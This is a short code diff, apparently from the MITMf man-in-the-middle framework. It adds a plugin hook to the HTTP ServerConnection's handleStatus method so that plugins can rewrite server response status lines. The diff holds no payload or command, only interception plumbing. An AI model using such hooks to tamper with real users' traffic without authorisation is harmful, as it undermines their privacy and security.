@@ -120,6 +120,7 @@ class ServerConnection(HTTPClient):
             self.sendPostData()
 
     def handleStatus(self, version, code, message):
+        version, code, message = self.plugins.hook()
         mitmf_logger.debug("[ServerConnection] Server response: {} {} {}".format(version, code, message))
         self.client.setResponseCode(int(code), message)
 
